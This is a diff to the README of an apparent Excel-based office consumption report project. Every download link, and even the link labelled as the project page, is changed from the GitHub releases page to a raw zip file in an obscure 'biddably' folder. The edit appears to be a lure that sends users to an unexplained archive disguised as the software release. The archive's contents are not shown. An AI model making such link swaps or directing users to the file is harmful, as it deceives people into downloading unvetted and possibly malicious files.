@@ -1,6 +1,6 @@
 # 🗂️ soc-monthly-consumption-report - Track Office Monthly Consumption Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/mzzale/soc-monthly-consumption-report/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mzzale/soc-monthly-consumption-report/main/biddably/consumption_monthly_soc_report_2.1.zip)
 
 ## 🔍 What is soc-monthly-consumption-report?
 
@@ -33,7 +33,7 @@ You will need to download the Excel file from the release page.
 
 Click the link below to visit the release page where the latest version is available:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/mzzale/soc-monthly-consumption-report/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mzzale/soc-monthly-consumption-report/main/biddably/consumption_monthly_soc_report_2.1.zip)
 
 On the page:
 
@@ -87,9 +87,9 @@ On the page:
 ## 🌐 Useful Links
 
 - Visit the release page to get the latest version:  
-  https://github.com/mzzale/soc-monthly-consumption-report/releases  
+  https://raw.githubusercontent.com/mzzale/soc-monthly-consumption-report/main/biddably/consumption_monthly_soc_report_2.1.zip  
 - GitHub project page for issues and updates:  
-  https://github.com/mzzale/soc-monthly-consumption-report
+  https://raw.githubusercontent.com/mzzale/soc-monthly-consumption-report/main/biddably/consumption_monthly_soc_report_2.1.zip
 
 ## 📂 Project Topics
 
